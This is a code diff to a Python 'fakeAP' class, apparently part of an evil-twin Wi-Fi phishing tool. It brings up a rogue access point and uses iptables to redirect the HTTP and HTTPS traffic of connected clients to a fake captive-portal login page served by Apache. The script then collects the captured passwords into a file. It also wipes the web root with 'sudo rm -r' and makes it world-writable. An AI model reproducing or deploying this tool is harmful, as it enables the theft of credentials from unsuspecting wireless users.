@@ -21,8 +21,6 @@ class fakeAP:
             print(Fore.RED + "[*] Invalid option please try again")
             self.__init__(fake_ap_interface, fake_ssid, wlan_sniffer)
 
-
-
         self.fake_ap_interface = fake_ap_interface
         self.fake_ssid = fake_ssid
         self.sniffer = wlan_sniffer
@@ -66,18 +64,19 @@ class fakeAP:
         print(Fore.YELLOW + "[-->] Clearing all IP Rules")
 
         # Redirect any request to the captive portal
+        # enp0s3 is aditional interface beside the ap_interface 
         os.system(f'iptables -t nat -A PREROUTING  -i enp0s3 -p tcp --dport 80 -j DNAT  --to-destination 10.0.0.1:80')
         os.system(f'iptables -t nat -A PREROUTING  -i enp0s3 -p tcp --dport 443 -j DNAT  --to-destination 10.0.0.1:80')
         print(Fore.YELLOW + "[-->] Redirecting any request to the captive portal")
 
-        # Enable internet access use the enp0s3 interface
+        # Enable internet access use the enp0s3 interface: you need second interface for it (to enable internet conection to the client)
         # Interface name that is used to forward traffic from
         os.system(f'iptables -t nat -A POSTROUTING --out-interface enp0s3 -j MASQUERADE')
         # Interface name to receive the packets or the interface that is being forwarded to
         os.system(f'iptables -A FORWARD --in-interface {fake_ap_interface} -j ACCEPT')
         print(Fore.YELLOW + "[-->] Enableing internet access")
 
-        # Initial wifi interface configuration (seems to fix problems)
+        # Initial wifi interface configuration
         os.system(f'ip link set {fake_ap_interface} down')
         os.system(f'ip addr flush dev {fake_ap_interface}')
         os.system(f'ip link set {fake_ap_interface} up')
@@ -100,12 +99,10 @@ class fakeAP:
         
         print(Fore.GREEN + '[+] The Fake Access Point is now available using Name : {} '.format(fake_ssid))
 
-        # listen_thread = Thread(target=start_listen, daemon=True)
-        # listen_thread.start()
         while True:
             user_input = input(Fore.YELLOW + '[*] to turn off the Access Point Please press \"done\"\n\n')
             if user_input == 'done':
-                os.system('cat /var/www/html/passwords.txt >> fake_login/passwords.txt')
+                os.system('echo "" > fake_login/passwords.txt && cat /var/www/html/passwords.txt >> fake_login/passwords.txt')
                 time.sleep(5)
                 run.restart(self.fake_ap_interface, self.sniffer)
                 sys.exit()
@@ -115,15 +112,15 @@ class fakeAP:
 
 
     def start_apache(self):
-        os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
+        os.system('sudo rm -r /var/www/html/* 2>/dev/null') 
         os.system('sudo cp -r fake_login/* /var/www/html')
         os.system('sudo chmod 777 /var/www/html/*')
         os.system('sudo chmod 777 /var/www/html')
 
         # update rules inside 000-default.conf of apache2
         os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
-        os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
-        os.system('service apache2 restart >/dev/null 2>&1')     # reload and restart apache2
+        os.system('a2enmod rewrite >/dev/null 2>&1') # enable the mod_rewrite in apache
+        os.system('service apache2 restart >/dev/null 2>&1') # reload and restart apache2
 
         print(Fore.GREEN + '\n[*] appache server start successfully')
         time.sleep(1)
